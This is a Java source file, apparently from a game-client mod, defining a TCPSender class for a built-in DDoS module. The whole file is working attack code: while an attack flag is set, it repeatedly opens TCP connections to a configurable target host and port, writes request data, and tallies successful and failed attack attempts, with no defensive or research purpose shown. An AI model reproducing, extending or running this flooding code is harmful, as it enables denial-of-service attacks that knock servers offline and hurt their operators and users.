package com.lawab1ders.nan7i.kali.module.impl.other.ddos.senders;

/*
 * Copyright (c) 2025 EldoDebug, Nan7i.南起
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated
 * documentation files (the "Software"), to deal in the Software without restriction, including without limitation
 * the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and
 * to permit persons to whom the Software is furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all copies or substantial portions of
 * the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO
 * THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF
 * CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
 * IN THE SOFTWARE.
 */

import com.lawab1ders.nan7i.kali.InstanceAccess;
import com.lawab1ders.nan7i.kali.module.impl.other.DDoSModule;
import com.lawab1ders.nan7i.kali.module.impl.other.ddos.DDoSController;
import lombok.AllArgsConstructor;

import java.io.OutputStreamWriter;
import java.net.InetSocketAddress;
import java.net.Socket;

@AllArgsConstructor
public final class TCPSender implements Runnable, InstanceAccess {

    private final String targetHost;
    private final int targetPort, connectionTimeout;
    private final String requestData;

    @Override
    public void run() {
        while (DDoSController.isAttacking) {
            try {
                Socket socket = new Socket();
                InetSocketAddress address = new InetSocketAddress(targetHost, targetPort);

                socket.connect(address, connectionTimeout);

                OutputStreamWriter writer = new OutputStreamWriter(socket.getOutputStream());
                writer.write(requestData);
                writer.close();
                socket.close();

                Thread.sleep(mod.getModule(DDoSModule.class).requestDelaySetting.getValue());

                DDoSController.attackCount++;
            } catch (Exception e) {
//                e.printStackTrace();

                DDoSController.failedCount++;
            }
        }
    }
}
